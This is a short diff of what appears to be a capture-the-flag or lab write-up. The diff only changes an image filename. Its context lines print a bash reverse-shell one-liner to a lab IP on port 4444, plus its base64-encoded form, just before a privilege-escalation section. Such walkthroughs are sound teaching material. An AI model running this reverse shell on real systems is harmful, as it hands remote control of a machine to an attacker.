@@ -53,7 +53,7 @@ $ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.56/4444 0>&1"  ' | base64
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ni80NDQ0IDA+JjEiICAK
 ```
 
-<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
